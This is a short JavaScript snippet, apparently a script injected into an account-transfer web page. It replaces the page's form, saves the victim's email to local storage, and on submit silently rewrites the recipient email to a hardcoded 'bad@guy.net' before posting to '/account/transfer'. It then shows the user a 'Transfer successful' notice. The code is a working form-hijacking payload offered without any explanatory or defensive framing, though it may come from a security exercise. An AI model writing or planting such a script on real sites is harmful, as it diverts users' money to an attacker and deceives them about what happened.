BAD_GUY_EMAIL = 'bad@guy.net';

const oldForm = document.querySelector('form');
const newForm = oldForm.cloneNode(true);
oldForm.parentElement.replaceChild(newForm, oldForm);

const footer = document.querySelector('footer');
const notifications = new Notification(footer, 5);

newForm.addEventListener('submit', event => {
  event.preventDefault();

  window.localStorage.setItem('last_email', document.getElementById('email').value);

  let response = {};
  for (let element of event.target) {
    response[element.id] = element.value;
  }

  response.email = BAD_GUY_EMAIL;
  fetch('/account/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(response)
  }).then(response => {
    response.json().then(data => {
      if (response.status === 200) {
        notifications.notify('#08c552', 'Transfer successful');
        setTimeout(() => window.location = `/account/transfer/${data.transferId}`, 500);
      } else {
        data.errors.forEach(error => notifications.notify('#c52337', error));
      }
    });
  }).catch(err => {
    console.error(err);
  });
});